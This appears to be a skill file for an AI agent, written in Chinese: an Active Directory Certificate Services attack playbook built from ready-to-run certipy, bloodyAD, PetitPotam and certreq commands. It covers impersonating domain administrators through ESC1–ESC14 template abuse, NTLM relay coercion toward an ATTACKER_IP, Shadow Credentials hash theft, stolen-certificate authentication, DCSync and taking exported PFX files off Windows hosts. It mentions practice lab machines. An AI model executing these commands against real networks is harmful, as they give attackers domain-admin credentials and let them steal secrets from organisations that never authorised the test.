---
name: 'adcs-attack-chain'
description: 'ADCS 全攻击链：certipy find（certipy 覆盖 ESC1-16+；本库分节止于 ESC14）→Shadow Credentials→证书窃取→PKINITtools。每条 ESC 的实战命令和常见坑（含 ESC9 UPN 改写、ESC8 假阳性判定、ESC13 链式升组、ESC14 altSecurityIdentities 显式映射）。🆕 含第 0 步「先 dump 全矩阵再选型」（模板 × 标志位 × Enrollment Rights，禁逐个试模板）。（检索词：BloodHound/certipy/adcs/ESC1/ESC13/ESC14/OIDGroupLink/altSecurityIdentities/OpenGraph/SharpHound/attack/chain/全表/全矩阵/matrix/Enrollment Rights/msPKI-Enrollment-Flag/模板选择/template selection/枚举先全表）'
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# ADCS 攻击全链 — Certipy 实战参考

## 🔴 第 0 步：枚举类问题先要「全表」，再谈「选哪个」

**触发**：面对 CA / 模板 / ACL 这类"有 N 个候选、要挑一个能打的"的问题时。

```
[ ] 🔴 先一次 dump 全矩阵（一条 certipy find 就够），再谈选型
[ ] 矩阵必须含三列：模板名 × 关键标志位（ESS / ClientAuth / RequiresManagerApproval）
    × **Enrollment Rights 的每个主体**（不是"有权限"三个字）
[ ] 🔴 判据：能不能指着表说"**唯一**可行组合是 <模板> + <主体>"？说不出就是表不全
[ ] 逐个试模板 = 反模式（试一个删一个候选，且每次都要重跑中继）
```

> 🔴 实测（Ifrit，Pro Lab）：`certipy find` **一次输出**的 12 个启用模板矩阵直接定位了唯一可行组合
> （`IT-Computers` + `FS02$` —— 因为**只有它的 Enrollment Rights 含机器账号**）；
> 而在此之前"模板逐个试"（`DomainController` → `Machine` → `User` …）白烧了 **~30 分钟**。
> 另一条同源教训：**CA 层的 `Enroll` 权限不是决定性的，模板层 ACL 才是** ——
> CA 写着 `Authenticated Users`，模板层没有跨林主体 ⇒ 跨林 ESC8 照样全拒。
> ⇒ 廉价且决定性的一步，应该**一上来就做**。

## 快速命令速查

### 枚举
```bash
certipy find -u 'user@domain' -p 'pass' -dc-ip 10.0.0.100 -stdout -enabled -vulnerable -hide-admins
```

### ESC1 (SAN 指定 → 冒充任何用户)
```bash
certipy req -u 'a@d' -p 'p' -dc-ip IP -target 'CA.dom' -ca 'CA-NAME' -template 'TPL' -upn 'admin@dom' -sid S-1-5-21-...-500
certipy auth -pfx 'admin.pfx' -dc-ip IP
```

### ESC2/3 (Any Purpose / Enrollment Agent)
```bash
# 先拿 Enrollment Agent 证书
certipy req -u 'a@d' -p 'p' -dc-ip IP -target 'CA' -ca 'CA-NAME' -template 'RA-TEMPLATE'
# 代理请求其他用户
certipy req -u 'a@d' -p 'p' -dc-ip IP -target 'CA' -ca 'CA-NAME' -template 'User' -on-behalf-of 'DOM\admin' -pfx 'a.pfx'
certipy auth -pfx 'admin.pfx' -dc-ip IP
```

### ESC4 (模板 ACL 可写 → 改成 ESC1 然后打)
```bash
certipy template -template 'TPL' -u 'a@d' -p 'p' -dc-ip IP -save-configuration orig.json
certipy template -template 'TPL' -u 'a@d' -p 'p' -dc-ip IP -write-default-configuration
# ... ESC1 exploit ...
certipy template -template 'TPL' -u 'a@d' -p 'p' -dc-ip IP -write-configuration orig.json
```

### ESC6 (CA 级 SAN 标志 — 所有模板可用)
```bash
certipy req -u 'a@d' -p 'p' -dc-ip IP -target 'CA' -ca 'CA-NAME' -template 'User' -upn 'admin@dom' -sid S-...-500
certipy auth -pfx 'admin.pfx' -dc-ip IP
```

### ESC8 (NTLM Relay → AD CS HTTP)
```bash
# 终端1: 启动 relay
certipy relay -target 'http://CA.DOM' -ca 'CA-NAME' -template 'DomainController' -interface 0.0.0.0
# 终端2: 强制认证
python3 PetitPotam.py -d domain -u 'user' -p 'pass' 'ATTACKER_IP' 'DC01.domain'
# 终端1 收到 DC$ 证书 → auth
certipy auth -pfx 'dc01.pfx' -dc-ip IP -username 'DC01$' -domain 'domain'
```

### ESC9 (无 SID 扩展 + UPN 改写 → 证书映射到别人)
> 触发：`certipy req` 输出 **Certificate has no object SID**，且你对某账户有 GenericWrite（能写 `userPrincipalName`）。
> 形状：CA 不给证书加对象 SID 扩展 ⇒ KDC 退回**弱映射**（按 UPN/sAMAccountName 查账户）⇒ 谁的名字出现在证书 SAN 里就变成谁。

```bash
# 1) 把【可控账户】的 UPN 改成目标（域管）的 UPN —— UPN 不是特权属性，LDAP 直写即可
bloodyAD --host DC -d dom -u <holder> -p P set object 'CN=<ctrl>,OU=Users,OU=dc,DC=dom' userPrincipalName -v 'Administrator@dom'
# 2) 以该账户申请可 ClientAuth 的模板（SAN 自动取自 UPN，模板需 UserSpecifiedSAN 关闭）
certipy req -u <ctrl> -p P -ca 'CA-NAME' -template User -dc-ip DC
#    → Got certificate with UPN 'Administrator@dom'   /   Certificate has no object SID   → administrator.pfx
# 3) ★ 回滚 UPN：证书不可变、SAN 已保留；留着重复 UPN 会让 KDC 弱映射命中错账户
bloodyAD --host DC -d dom -u <holder> -p P set object 'CN=<ctrl>,...' userPrincipalName -v '<ctrl>@dom'
# 4) 同步时钟（不同步必报 KRB_AP_ERR_SKEW）后 PKINIT
ntpdate -u DC
certipy auth -pfx administrator.pfx -dc-ip DC
#    → [*] Got TGT  /  Got hash for 'administrator@dom': aad3b...:<NTHASH>
```

**两个中间信号（判定"已经半个身子进去了"）**：
- 报 `Name mismatch between certificate and user` ⇒ 证书已签发但 KDC 映射到了别的账户（多为 UPN 重复）⇒ 回滚 UPN 重试。
- 报 **`KRB_AP_ERR_SKEW`** ⇒ **映射已通过**，只剩时钟 ⇒ `ntpdate -u DC` 后重试即成功。

拿到 NT hash / ccache 后直接 DCSync（见 `quickref-cards` 的域管后动作）。

### ESC10 / ESC11（速查）
- **ESC10**：与 ESC9 同源（弱映射），滥用面是 `userPrincipalName`/`sAMAccountName` 的**写入权**——有写权就能改名字，没写权就免谈。
- **ESC11**：CA 的 ICPR（RPC 注册）未强制加密时，可把机器账户认证**中继到 CA 的 RPC 接口**取证书。判定看 `certipy find` 的 **Enforce Encryption for Requests**：`Enabled` ⇒ 不可用（本例即如此）。
- **ESC8 的假阳性**：`certipy find` 报 Web Enrollment 可用 **不等于** `certsrv` 真存在。**必须落地探测 `https://<CA>/certsrv/certfnsh.asp`**——本例 CA 注册表声称启用、实际该虚拟目录在 80/443 全路径 404（未认证时的 401 只是站点级认证）。

### 🔴 ESC13（签发策略 OID → 组会员资格）— 最容易漏的"最后一公里"

> **机制**：模板上配了 `msPKI-Enterprise-Oid`（签发策略 OID），而该 OID 对象通过 **`msDS-OIDToGroupLink`** 链接到某个组。
> 谁用这个模板拿到证书，谁就在**证书有效期内自动获得那个组的会员资格**（KDC 把该组 SID 放进 PAC）。
> **这不是漏洞，是设计** —— 但管理员常把高权限组这样挂上去，等于开了后门。

**判断信号**：
```bash
certipy find -u 'u@d' -p P -dc-ip DC -stdout     # 看模板的 Issuance Policies / Enterprise OID
# BloodHound 预置查询: "Enrollment rights on CertTemplates with OIDGroupLink"
```

**利用（链式，每一步都要换新 TGT）**：
```bash
# 1) 用挂 OID 的模板申请证书 —— 此刻起你的 PAC 里带上那个组的 SID
certipy req -u 'svc_x' -hashes :<NT> -ca 'CA-NAME' -template 'ManagerAuthentication' -dc-ip DC -dns DC
# 2) 换 TGT（★ 必须重换，旧 TGT 里没有新组 SID）
certipy auth -pfx svc_x.pfx -kirbi -dc-ip DC
impacket-ticketConverter svc_x.kirbi svc_x.ccache
# 3) 用这个 TGT 去申请【下一个】模板 —— 它的 Enrollment 权限现在对你开放了
KRB5CCNAME=svc_x.ccache certipy req -u 'svc_x' -k -no-pass -ca 'CA-NAME' \
  -template 'BackupSvcAuthentication' -dc-ip DC -target DC.dom
```

🔴 **ESC13 天生是"链式"的**：模板 A 把你升进组 A → 组 A 有权限注册模板 B → 模板 B 再把你升进组 B……
**每跳都要重新 `certipy auth` 拿新 TGT**（这是最容易漏的一步：拿着旧 TGT 去打下一跳必然失败）。
见到 ESC13 要**顺着查下一跳**，而不是打一次就收工。

🔴 **常见终点组**：`Backup Operators`（可读 SAM/SYSTEM/SECURITY hive → 本地 secretsdump）、
`Certificate Managers`、`ServiceAccounts`。拿到 hive 后走本地离线 dump 再 DCSync。

### 🆕 ESC14（Scenario A）—— `altSecurityIdentities` 显式证书映射滥用

> **机制**：`altSecurityIdentities` 允许把**证书直接映射到账户**，**绕过模板的 SAN/UPN 推导逻辑**。
> 谁有该属性的**写权限**，谁就能把**自己持有的证书**绑到**任意高权账户**上 → 用那张证书 PKINIT，拿到的就是**那个账户**。
> **Scenario A** = 映射关系**显式**写在该属性里（区别于靠模板隐式推导的那类）。

**判断信号**：
```bash
# 哪些账户的 altSecurityIdentities 非空、且我有写权限？
nxc ldap DC -u u -p P --query "(altSecurityIdentities=*)" altSecurityIdentities

# BloodHound（需 SharpHound v2.14.0+）会画出两条 ESC14 专属边：
#   WriteAltSecurityIdentities  —— 能改映射 = 能把证书绑到别人身上
#   WritePublicInformation      —— 能写 publicInformation（含证书材料）
```

**利用**：
```bash
# 1) 拿一张自己可控的证书（任意模板即可 —— 关键在【映射】不在模板强度）
certipy req -u 'me@dom' -p P -ca 'CA' -template 'User' -dc-ip DC

# 2) 把该证书绑到目标高权账户的 altSecurityIdentities（映射串三选一）
#      X509:<I>CA-ISSUER<S>SUBJECT         —— issuer + subject
#      X509:<SKI>KEY-ID                     —— subject key identifier
#      X509:<SHA1-PUKEY>PUBLIC-KEY-HASH     —— 公钥哈希（最稳，不随重签变化）

# 3) PKINIT 这张证书 → 得到【目标账户】的 TGT
certipy auth -pfx me.pfx -dc-ip DC
```

🔴 **和 ESC9 的区别（最容易混）**：

| | 改什么 | 怎么生效 | 要回滚吗 |
|---|---|---|---|
| **ESC9** | **你自己**的 UPN | KDC **弱映射**把你认成别人（**隐式**） | ✅ 必须回滚 UPN |
| **ESC14** | **目标**的 `altSecurityIdentities` | **显式**声明"这张证书 = 这个账户" | 不碰自己任何属性 |

**判据一句话**：**你有没有 `altSecurityIdentities` 的写权限**。有 → ESC14；只有自己账户的 UPN 写权 → ESC9。

### 🆕 BloodHound CE v8.0 + OpenGraph（攻击路径管理已扩到 AD 之外）
- 把攻击路径从 **AD 扩展到非 AD 系统**：**GitHub、Snowflake、MSSQL、Okta** 等。
- 扩展作者可自定义**节点/关系类型**与 **Entity Panel** 内容。
- ADCS 侧新增边（**需 SharpHound v2.14.0+**）：`WriteAltSecurityIdentities`、`WritePublicInformation`
  → **没有这个版本就看不到 ESC14 的路径**，会整条漏掉。
- 配套工具：**ADPathFinder**（NetSPI）做 OpenGraph 攻击路径映射。
- ⚠️ SharpHound/AzureHound 现在把**对象 ID 全大写**上报，服务端**不再做 ID 归一化** → 自己解析血缘数据时要按大写匹配。

🔴 **certipy 已覆盖 ESC1–ESC16+**（**工具覆盖上界**）；但**本库分节止于 ESC14**——Shadow Credentials、Golden Certificates 也在 certipy 能力内。
本卡分节止于 ESC14 —— 遇到编号更高的（ESC15/16）**先 `certipy find` 看它给的标签**，再回到本卡找对应原语。
机制大多仍是同一条：**有写权 → 改映射/改身份 → 拿证书 → PKINIT**。

### 🔴 在【Windows 目标上】注册/导出证书（没有 certipy 时）

拿到 Windows 命令执行后想走 PKINIT，不必把 pfx 从 Linux 侧绕 —— 直接用系统自带工具：

```cmd
:: 1) 生成请求（req.inf 里写 Subject / SAN / Template / KeyLength）
certreq -new req.inf req.req
:: 2) 提交给指定 CA（Get-Certificate 在部分环境【没有 -CertificationAuthority 参数】，用经典 certreq）
certreq -submit -config "DC01.dom\CA-NAME" req.req cert.cer
:: 3) 落地到"我的"存储
certreq -accept cert.cer
:: 4) 带私钥导出 PFX
certutil -exportPFX -p "<pfx密码>" My <SerialNumber> out.pfx
```
★ 拿到 pfx 后**立刻外带**（`C:\Windows\Temp` 会被清理）——见 ad-checklist 文件传输一节。

**certipy 侧同族三坑**（都在 Mist 上实测踩过）：
```
[ ] CERTSRV_E_KEY_LENGTH（"密钥长度不足"）→ 加 -key-size 4096
[ ] TEMPLATE_DENIED 但模板 Enrollment 权限没问题
      → 极可能是【没用上一跳的 TGT】：ESC13 是链式的，先 certipy auth 换新 TGT 再 req
[ ] 目标 pfx 已存在 → certipy 会【交互式提问】导致脚本挂起
      → 先 rm 掉 pfx，并且用 `< /dev/null` 跑
```

**验证证书真的带了期望的签发策略 OID**（ESC13 生效的输入侧前提）：
```bash
openssl x509 -in hop1.crt -noout -text | grep -A2 "Certificate Policies"
# 应看到 1.3.6.1.4.1.311.21.8.<...> 形态的 OID，且与目标模板上配的一致
```
★ 证书 OID 对了**只说明输入侧无误**；组是否真进了 PAC，最终以"用该 TGT 去做那件事能否成功"为准。

### Shadow Credentials (GenericWrite → 直接拿 hash)
```bash
certipy shadow auto -u 'a@d' -p 'p' -dc-ip IP -account 'target'
# 输出: NT hash for 'target': xxxx
```

### 证书窃取 (THEFT)
```bash
certipy auth -pfx 'stolen.pfx' -dc-ip IP -username 'victim' -domain 'dom'
# 或用 PKINITtools: gettgtpkinit.py → getnthash.py (需要 -key)
```

## 常见坑
1. **"no object SID"** → 加 `-username victim -domain dom`
2. **KDC_CLIENT_NOT_TRUSTED** → 加 `-crl 'ldap:///'` 
3. **Clock skew** → `ntpdate -b DC_IP`
4. **-target 必须匹配 CA DNS 名**
5. **Web Enrollment relay 需要 EPA/Channel Binding 禁用**
6. **ESC8 必须落地验证** `certsrv` 虚拟目录是否真存在（脚本报可用 ≠ 目录存在）；未认证 401 只是站点级认证，认证后 404 才是真相。
7. **ESC9 的 UPN 必须回滚**：证书签发后 SAN 已固化，但留着重复 UPN 会让 KDC 弱映射命中错账户（`Name mismatch between certificate and user`）。
8. **拿到 `KRB_AP_ERR_SKEW` 是进展而非失败**：说明映射已通过；`ntpdate -u <DC>` 后重试即出 TGT。
9. **哪些属性被 `SeEnableDelegationPrivilege` 拦住**：`msDS-AllowedToDelegateTo` 与 `TRUSTED_FOR_DELEGATION`(0x80000) 写不了；但 **`TRUSTED_TO_AUTH_FOR_DELEGATION`(0x1000000) 与 `userPrincipalName` 可写** —— 这个组合就是转向 ESC9 的信号。

## Certipy 版本功能
- v4+ → shadow, template, relay, account
- v5+ → ESC9-16, -forever, parse, 改进 cleanup

**Why:** ADCS 是我 7 个已完成 Windows/AD 靶机的最大盲区，一次都没实战过。ESC1-8 是最常见的 AD 提权路径。
**How to apply:** AD 靶机拿到域用户后，第一件事跑 `certipy find -vulnerable`。
